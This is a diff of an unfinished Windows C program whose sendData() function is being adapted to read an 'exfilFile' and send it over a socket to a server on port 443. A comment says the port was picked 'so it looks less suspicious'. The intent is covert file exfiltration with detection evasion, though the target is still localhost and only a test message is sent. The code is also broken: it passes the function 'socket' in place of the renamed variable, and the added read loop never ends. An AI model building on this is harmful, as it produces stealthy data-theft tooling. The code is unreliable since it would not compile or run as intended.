@@ -1,4 +1,6 @@
 #include <stdio.h>
+#include <stdlib.h>
+
 // Library for implementing the sleep() function
 #include <windows.h>
 
@@ -40,12 +42,12 @@ int checkIfFileExists(const char *fileName)
     return 0;
 }
 
-int sendData(){
+int sendData(FILE *exfilFile){
 
     // TODO: Implement read of File
 
     WSADATA wsa;
-	SOCKET s;
+	SOCKET sock;
 	struct sockaddr_in server;
 	char *message;
 
@@ -62,7 +64,7 @@ int sendData(){
 	printf("Initialised.\n");
 	
 	
-	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
+	if((sock = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
 	{
 		printf("Could not create socket : %d" , WSAGetLastError());
         WSACleanup();
@@ -71,11 +73,12 @@ int sendData(){
 
 	printf("Socket created.\n");
 
+	// Defining Remote Server with Port 443, so it looks less suspicious
 	server.sin_addr.s_addr = inet_addr("127.0.0.1");
 	server.sin_family = AF_INET;
 	server.sin_port = htons( 443 );
 
-	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
+	if (connect(socket , (struct sockaddr *)&server , sizeof(server)) < 0)
 	{
 		puts("connect error");
 		return 1;
@@ -83,9 +86,18 @@ int sendData(){
 	
 	printf("Connected\n");
 
+
+	char buffer[11];
+	int charCount = 0;
+
+	while(1) {
+		int c = fgetc(exfilFile);
+
+	}
+
 	message = "Test Message";
 
-	if( send(s, message, strlen(message) , 0) < 0)
+	if( send(socket, message, strlen(message) , 0) < 0)
 	{
 		printf("Send failed");
 		return 1;
